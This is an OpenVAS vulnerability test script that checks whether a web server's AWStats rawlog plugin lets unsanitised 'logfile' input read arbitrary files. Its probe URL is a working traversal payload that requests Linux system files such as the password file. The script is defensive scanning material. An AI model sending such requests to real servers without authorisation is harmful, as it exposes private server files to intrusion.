###################################################################
# OpenVAS Vulnerability Test
# $Id: awstats_input_vuln.nasl 9783 2018-05-09 13:57:32Z cfischer $
#
# AWStats rawlog plugin logfile parameter input validation vulnerability
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on work from (C) Tenable Netwok Security
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###################################################################

CPE = "cpe:/a:awstats:awstats";

# Ref: Johnathan Bat <spam@blazemail.com>

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14347");
  script_version("$Revision: 9783 $");
  script_bugtraq_id(10950);
  script_tag(name:"last_modification", value:"$Date: 2018-05-09 15:57:32 +0200 (Wed, 09 May 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("AWStats rawlog plugin logfile parameter input validation vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2004 David Maciejak");
  script_family("Web application abuses");
  script_dependencies("awstats_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("awstats/installed");

  script_tag(name:"solution", value:"Upgrade to the latest version of this software");

  script_tag(name:"summary", value:"The remote host seems to be running AWStats, a free real-time logfile analyzer.

  AWStats Rawlog Plugin is reported prone to an input validation vulnerability.");

  script_tag(name:"impact", value:"An attacker may exploit this condition to execute commands remotely or disclose
  contents of web server readable files.");

  script_tag(name:"insight", value:"The issue is reported to exist because user supplied 'logfile' URI data passed
  to the 'awstats.pl' script is not sanitized.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
if( dir == "/" ) dir = "";

files = traversal_files( "linux" );

hostname = get_host_name();

foreach file( keys( files ) ) {

  url = dir + "/awstats.pl?filterrawlog=&rawlog_maxlines=5000&config=" + hostname + "&framename=main&pluginmode=rawlog&logfile=/" + files[file];

  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
